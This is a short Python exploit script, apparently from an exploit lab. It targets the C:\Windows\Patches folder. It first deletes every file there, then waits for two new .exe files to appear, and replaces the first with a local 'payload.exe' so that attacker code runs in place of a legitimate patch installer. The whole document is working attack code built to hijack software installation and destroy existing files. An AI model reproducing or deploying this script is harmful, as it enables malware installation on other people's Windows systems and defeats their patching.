'''
Created on Dec 21, 2012
@author: RabbidByte (previously Essential Exploit Labs)
'''
import os, shutil
path="C:\\Windows\\Patches\\"
payload="payload.exe"
hook=0
files = []

dirList=os.listdir(path)
for fname in dirList:
    fileToDelete = path
    fileToDelete += fname
    os.remove(fileToDelete)
fname = None

while hook==0:
    dirList = None
    dirList=os.listdir(path)
    for fname in dirList:
        if fname.endswith(".exe"):
            if fname not in (files):
                files.append(fname)
    if len(files) > 1:
        print "We got the Files "
        print files[0]
        print "and "
        print files[1]
        print "Time to launch payload!"
        hook=1

fReplace = path
fReplace += files[0]
shutil.copy(payload, fReplace)